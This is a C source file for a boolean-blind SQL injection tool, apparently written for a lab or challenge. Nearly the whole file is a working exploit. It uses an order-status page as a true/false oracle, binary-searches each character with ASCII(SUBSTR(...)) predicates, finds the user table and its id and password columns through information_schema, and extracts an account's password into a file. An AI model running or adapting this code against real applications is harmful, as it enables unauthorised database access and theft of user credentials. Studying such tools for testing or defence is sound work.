/*
 * blind_sqli.c
 *
 * Boolean-based blind SQL injection driver.
 *
 * The application's order-status page acts as a boolean oracle: it reports the
 * order as "sent" when an injected SQL condition evaluates true. Each byte of
 * target data is recovered with a binary search over its ASCII value using
 * predicates of the form ASCII(SUBSTR((<select>), i, 1)) > mid, costing about
 * seven requests per character.
 *
 * The tool first discovers the user table and the id/password column names
 * from information_schema, then extracts the password for the configured
 * account and writes it, wrapped in asterisks, to "<marker>.txt".
 */

#include "http_oracle.h"
#include "config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* The lab records names of up to 10 bytes; 16 gives headroom. */
#define MAX_STR_LEN 16

/*
 * Recover the character at position 'index' (1-based) of the string produced
 * by a query. query_template must contain two %d placeholders: the position
 * and the midpoint compared against. Returns 0 if no character is found.
 */
static char binary_search_char(const char *query_template, int index)
{
    int min = 0;
    int max = 127;
    char condition[512];

    while (min <= max) {
        if (min == max) {
            return (char)min;
        }
        int mid = (min + max) / 2;

        int n = snprintf(condition, sizeof(condition), query_template, index, mid);
        if (n < 0 || (size_t)n >= sizeof(condition)) {
            fprintf(stderr, "Error: SQL condition buffer too small.\n");
            exit(1);
        }

        if (sqli_oracle(condition)) {
            min = mid + 1; /* character value is greater than mid */
        } else {
            max = mid;     /* character value is <= mid           */
        }
    }
    return 0;
}

/*
 * Extract the full string produced by sql_select into output_buffer, one
 * character at a time, stopping at the first non-printable byte (end of
 * string). output_buffer must hold at least MAX_STR_LEN + 1 bytes.
 */
static void extract_string(const char *sql_select, char *output_buffer)
{
    char query_template[512];
    int n = snprintf(query_template, sizeof(query_template),
                     "ASCII(SUBSTR((%s),%%d,1))>%%d", sql_select);
    if (n < 0 || (size_t)n >= sizeof(query_template)) {
        fprintf(stderr, "Error: query template too long.\n");
        exit(1);
    }

    output_buffer[0] = '\0';
    for (int i = 1; i <= MAX_STR_LEN; i++) {
        char c = binary_search_char(query_template, i);
        if (c < 32 || c > 126) {
            break;
        }
        output_buffer[i - 1] = c;
        output_buffer[i] = '\0';
    }
}

/* Build a column-discovery query for columns LIKE the given hex pattern. */
static void discover_column(const char *table_name, const char *hex_like,
                            char *out, const char *what)
{
    char query[256];
    int n = snprintf(query, sizeof(query),
        "SELECT column_name FROM information_schema.columns "
        "WHERE table_name='%s' AND LOWER(column_name) LIKE %s LIMIT 1",
        table_name, hex_like);
    if (n < 0 || (size_t)n >= sizeof(query)) {
        fprintf(stderr, "Error: %s query too long.\n", what);
        exit(1);
    }
    extract_string(query, out);
    if (out[0] == '\0') {
        fprintf(stderr, "Error: could not discover %s.\n", what);
        exit(1);
    }
}

int main(void)
{
    char table_name[MAX_STR_LEN + 1] = {0};
    char id_col[MAX_STR_LEN + 1] = {0};
    char pwd_col[MAX_STR_LEN + 1] = {0};
    char password[MAX_STR_LEN + 1] = {0};
    const char *target_id = PROOF_MARKER;

    /* Discover the user table name (LIKE '%usr%'). */
    extract_string(
        "SELECT table_name FROM information_schema.tables "
        "WHERE table_schema=database() AND LOWER(table_name) LIKE 0x2575737225 LIMIT 1",
        table_name);
    if (table_name[0] == '\0') {
        fprintf(stderr, "Error: could not discover table name.\n");
        exit(1);
    }

    /* Discover the id column (LIKE '%id%') and password column (LIKE '%pwd%'). */
    discover_column(table_name, "0x25696425", id_col, "id column");
    discover_column(table_name, "0x2570776425", pwd_col, "password column");

    /* Extract the password for the configured account. */
    char q_final[256];
    int n = snprintf(q_final, sizeof(q_final),
        "SELECT `%s` FROM `%s` WHERE `%s`='%s'",
        pwd_col, table_name, id_col, target_id);
    if (n < 0 || (size_t)n >= sizeof(q_final)) {
        fprintf(stderr, "Error: final query too long.\n");
        exit(1);
    }
    extract_string(q_final, password);

    /* Write the recovered password in the required *password* format. */
    char filename[64];
    n = snprintf(filename, sizeof(filename), "%s.txt", target_id);
    if (n < 0 || (size_t)n >= sizeof(filename)) {
        fprintf(stderr, "Error: output filename too long.\n");
        exit(1);
    }

    FILE *f = fopen(filename, "w");
    if (f == NULL) {
        perror("fopen");
        exit(1);
    }
    fprintf(f, "*%s*", password);
    fclose(f);

    return 0;
}
